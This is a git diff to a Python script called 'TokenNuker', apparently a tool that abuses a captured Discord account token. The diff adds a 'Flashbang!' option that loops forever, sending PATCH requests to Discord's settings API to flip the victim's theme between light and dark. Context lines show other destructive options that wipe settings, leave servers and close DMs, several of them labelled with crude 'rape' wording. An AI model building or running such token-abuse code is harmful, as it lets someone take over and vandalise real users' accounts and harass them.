@@ -8,6 +8,7 @@ THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR I
 from colored import fg
 import requests
 import os
+import time
 
 r = fg(255) # Setup color variables
 r2 = fg(255)
@@ -44,6 +45,7 @@ class TokenNuker:
 
             self.options = [
                 ("Nuke it!", self.nuke),
+                ("Flashbang!", self.flashBang),
                 ("Rape settings", self.rapeSettings),
                 ("Leave servers", self.rapeServers),
                 ("Close Dms", self.rapeDms),
@@ -94,6 +96,20 @@ class TokenNuker:
             headers = self.headers,
             json = message
         )
+
+    def flashBang(self):
+        payloads = [{"theme" : "light"}, {"theme" : "dark"}]
+
+        try:
+            while True:
+                for payload in payloads:
+                    requests.patch(
+                        "https://canary.discordapp.com/api/v6/users/@me/settings",
+                        headers = self.headers,
+                        json = payload
+                    )   
+        except KeyboardInterrupt:
+            pass
 
     def rapeSettings(self):
         payload = {"theme" : "light","locale" : "ja","message_display_compact" : True,"inline_embed_media" : False,"gif_auto_play" : False,"render_embeds" : False,"render_reactions" : False,"animate_emoji" : False,"convert_emoticons" : False,"enable_tts_command" : False,"explicit_content_filter" : 0,"status" : "invisible"}
